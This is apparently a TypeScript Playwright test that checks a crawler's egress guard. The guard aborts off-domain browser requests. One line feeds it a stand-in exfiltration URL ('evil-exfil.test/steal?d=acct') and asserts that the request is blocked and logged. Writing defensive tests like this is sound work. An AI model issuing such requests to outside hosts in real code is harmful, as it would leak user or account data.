/**
 * Real-browser test for the egress guard: proves an off-domain request is actually aborted at the
 * route layer (not just that the decision function says so). Skips gracefully without a Chromium binary.
 */
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { chromium, type Browser } from 'playwright';
import { installEgressGuard } from './egress-guard';
import type { SessionLogger } from '../utils/logger';

describe('egress guard — real browser', () => {
  let browser: Browser | undefined;
  let available = false;

  beforeAll(async () => {
    // Match the crawler: launch system Chrome first, then bundled Chromium in CI.
    // This is the same browser-resolution path used by actions.browser.test.ts.
    const attempts = [{ channel: 'chrome' as const, args: ['--no-sandbox'] }, { args: ['--no-sandbox'] }];
    for (const options of attempts) {
      try {
        browser = await chromium.launch(options);
        available = true;
        return;
      } catch {
        /* try next launcher */
      }
    }
    console.warn('[egress-guard.browser.test] No Chrome/Chromium available — skipping browser test');
  });
  afterAll(async () => { await browser?.close(); });

  it('aborts an off-domain navigation and allows an inert page', async () => {
    if (!available || !browser) return;
    const blocked: string[] = [];
    const logger = {
      log: () => {},
      warn: (msg: unknown) => { blocked.push(String(msg)); },
      error: () => {},
    } as unknown as SessionLogger;

    const context = await browser.newContext();
    await installEgressGuard(context, 'https://example.com', ['cdn.allowed-assets.test'], logger);
    const page = await context.newPage();

    // Inert data: page is allowed.
    await page.goto('data:text/html,<h1>ok</h1>');
    expect(await page.content()).toContain('ok');

    // Off-domain navigation is intercepted and aborted (no real network needed).
    await expect(page.goto('https://evil-exfil.test/steal?d=acct')).rejects.toThrow();
    expect(blocked.some((m) => m.includes('evil-exfil.test'))).toBe(true);

    await context.close();
  }, 30000);
});
